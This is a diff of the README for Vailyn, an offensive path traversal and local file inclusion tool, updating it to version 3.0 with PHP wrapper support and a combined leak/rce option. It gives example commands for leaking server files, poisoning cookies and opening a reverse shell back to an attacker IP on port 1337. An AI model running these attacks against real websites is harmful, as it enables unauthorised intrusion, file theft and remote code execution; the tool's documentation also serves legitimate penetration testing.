@@ -6,7 +6,7 @@
 
 <p align="center">
   <a href="https://github.com/VainlyStrain/Vailyn/blob/master/Vailyn">
-    <img src="https://img.shields.io/static/v1.svg?label=Version&message=2.10&color=lightgrey&style=flat-square"><!--&logo=dev.to&logoColor=white"-->
+    <img src="https://img.shields.io/static/v1.svg?label=Version&message=3.0&color=lightgrey&style=flat-square"><!--&logo=dev.to&logoColor=white"-->
   </a>
   <a href="https://www.python.org/">
     <img src="https://img.shields.io/static/v1.svg?label=Python&message=3.7%2B&color=lightgrey&style=flat-square&logo=python&logoColor=white">
@@ -14,9 +14,9 @@
   Phased Path Traversal & LFI Attacks
 </p>
 
-> **Vailyn 2.0**
+> **Vailyn 3.0**
 >
-> Since v2.0, Vailyn has a Qt5 interface. Fire it up with the `--app` argument!
+> Since v3.0, Vailyn supports LFI PHP wrappers in Phase 1. Use `--lfi` to include them in the scan.
 
 ### About
 
@@ -74,7 +74,7 @@ $ python Vailyn -h
 
 ### Usage
 
-Vailyn has 3 mandatory arguments: `-v VIC, -a INT and -l FIL PATH`. However, depending on `-a`, more arguments may be required.
+Vailyn has 3 mandatory arguments: `-v VIC, -a INT and -l TP P1 P2`. However, depending on `-a`, more arguments may be required.
 
 ```
 mandatory:
@@ -85,15 +85,23 @@ mandatory:
     2|:  Path              5|;  Crawler (automatic)
     3|;  Cookie
 
-  -l FIL PATH, --lists FIL PATH
-                        Dictionaries (files and dirs)
+  -l TP P1 P2, --phase2 TP P1 P2
+                        Attack in Phase 2, and needed parameters
+
+┌[ Values ]────────┬────────────────┐
+│ TP   │ P1        │ P2             │
+├──────┼───────────┼────────────────┤
+│ leak │ File Dict │ Directory Dict │
+│ rce  │ IP Addr   │ Listening Port │
+└──────┴───────────┴────────────────┘
+
 additional:
   -p P, --param P       query parameter to use for --attack 1
   -s D, --post D        POST Data (set injection point with INJECT)
-  -j A P, --listen A P  Try a reverse shell in Phase 2 (A:IP, P:port)
   -d I J K, --depths I J K
                         depths (I: phase 1, J: phase 2, K: permutation level)
   -n, --loot            Download found files into the loot folder
+  --lfi                 Additionally use PHP wrappers to leak files
   -c C, --cookie C      File containing authentication cookie (if needed)
   -h, --help            show this help menu and exit
   -P, --precise         Use exact depth in Phase 1 (not a range)
@@ -125,9 +133,7 @@ You also must specify a target to attack. This is done via `-v VIC` and `-q V`, 
 
 Example: if the final URL should look like: `https://site.com/download.php?file=<ATTACK>&param2=necessaryvalue`, you can specify `-v https://site.com/download.php` and `-q &param2=necessaryvalue` (and `-p file`, since this is a query attack).
 
-To perform the bruteforce attack in phase 2, you need to specify 2 dictionaries:
-* FIL, containing **filenames only** (e.g. index.php)
-* PATH, containing **directory names only**. Vailyn will handle directory permutation for you, so you'll need only one directory per line.
+If you want to include PHP wrappers in the scan (like php://filter), use the `--lfi` argument. At the end of Phase 1, you'll be presented with an additional selection menu containing the wrappers that worked. (if any)
 
 If the attacked site is behind a login page, you can supply an authentication cookie via `-c COOKIEFILE`. If you want to attack over Tor, use `--tor`.
 
@@ -148,7 +154,13 @@ By specifying `-n`, Vailyn will not only display files on the terminal, but also
 
 If you want a verbose output (display every output, not only found files), you can use `--debug`. Note that output gets really messy, this is basically just a debug help.
 
-To gain a reverse shell, you can use the `-j A P` argument, where A is your listening IP, and P the port you want to listen on.
+To perform the bruteforce attack, you need to specify `-l leak FIL PATH`, where
+* FIL is a dictionary containing **filenames only** (e.g. index.php)
+* PATH, is a dictionary containing **directory names only**. Vailyn will handle directory permutation for you, so you'll need only one directory per line.
+
+To gain a reverse shell, you can use `-l rce IP PORT`, where
+* IP is your listening IP
+* PORT is the port you want to listen on.
 
 > **WARNING**
 >
@@ -178,36 +190,36 @@ To distinguish real results from false positives, Vailyn does the following chec
 
 ### Examples
 
-* Simple Query attack:
-`$ Vailyn -v "http://site.com/download.php" -a 1 -l dicts/files dicts/dirs -p file` --> `http://site.com/download.php?file=../INJECT`
+* Simple Query attack, leaking files in Phase 2:
+`$ Vailyn -v "http://site.com/download.php" -a 1 -l leak dicts/files dicts/dirs -p file` --> `http://site.com/download.php?file=../INJECT`
 
 * Query attack, but I know a file `file.php` exists on exactly 2 levels above the inclusion point:
-`$ Vailyn -v "http://site.com/download.php" -a 1 -l dicts/files dicts/dirs -p file -i file.php -d 2 X X -P`
+`$ Vailyn -v "http://site.com/download.php" -a 1 -l leak dicts/files dicts/dirs -p file -i file.php -d 2 X X -P`
 This will shorten the duration of Phase 1 very much, since its a targeted attack.
 
 * Simple Path attack:
-`$ Vailyn -v "http://site.com/" -a 2 -l dicts/files dicts/dirs` --> `http://site.com/../INJECT`
+`$ Vailyn -v "http://site.com/" -a 2 -l leak dicts/files dicts/dirs` --> `http://site.com/../INJECT`
 
 * Path attack, but I need query parameters and tag:
-`$ Vailyn -v "http://site.com/" -a 2 -l dicts/files dicts/dirs -q "?token=X#title"` --> `http://site.com/../INJECT?token=X#title`
+`$ Vailyn -v "http://site.com/" -a 2 -l leak dicts/files dicts/dirs -q "?token=X#title"` --> `http://site.com/../INJECT?token=X#title`
 
 * Simple Cookie attack:
-`$ Vailyn -v "http://site.com/cookiemonster.php" -a 3 -l dicts/files dicts/dirs`
+`$ Vailyn -v "http://site.com/cookiemonster.php" -a 3 -l leak dicts/files dicts/dirs`
 Will fetch cookies and you can select cookie you want to poison
 
 * POST Attack:
-`$ Vailyn -v "http://site.com/download.php" -a 4 -l dicts/files dicts/dirs -s "DATA1=xx&DATA2=INJECT"`
+`$ Vailyn -v "http://site.com/download.php" -a 4 -l leak dicts/files dicts/dirs -s "DATA1=xx&DATA2=INJECT"`
 will infect DATA2 with the payload
 
 * Attack, but target is behind login screen:
-`$ Vailyn -v "http://site.com/download.php" -a 1 -l dicts/files dicts/dirs -c cookie.txt`
+`$ Vailyn -v "http://site.com/download.php" -a 1 -l leak dicts/files dicts/dirs -c cookie.txt`
 
 * Attack, but I want a reverse shell on port 1337:
-`$ Vailyn -v "http://site.com/download.php" -a 1 -j MY.IP.IS.XX 1337  # a high Phase 2 Depth would be beneficial`
+`$ Vailyn -v "http://site.com/download.php" -a 1 -l rce MY.IP.IS.XX 1337  # a high Phase 2 Depth would be beneficial`
 (will start a ncat listener for you if on Unix)
 
 * Full automation in crawler mode:
-`$ Vailyn -v "http://root-url.site" -a 5` _you can also specify depths, lookup file here_ 
+`$ Vailyn -v "http://root-url.site" -a 5` _you can also specify other args, like depths, lfi & lookup file here_ 
 
 * Full automation, but Arjun needs `--stable`:
 `$ Vailyn -v "http://root-url.site" -a 5 -k ANY`
